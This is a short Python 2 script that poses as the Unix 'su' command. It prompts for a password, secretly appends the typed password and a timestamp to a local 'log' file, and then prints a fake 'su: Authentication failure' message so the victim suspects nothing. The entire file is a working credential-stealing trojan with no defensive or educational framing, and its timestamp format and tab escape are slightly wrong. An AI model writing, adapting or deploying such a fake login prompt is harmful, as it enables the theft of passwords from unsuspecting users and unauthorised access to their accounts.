#!/usr/bin/env python

import os, sys,getpass,time

current_time = time.strftime("%y-%m-%d %h:%m")

fail_str = "su: Authentication failure"

try:
	passwd = getpass.getpass(prompt='Password: ')
	file = open("log",'a')
	file.write("[%s]t%s"%(passwd,current_time))
	file.write("\n")
	file.close()

except:
	pass

time.sleep(1)
print fail_str

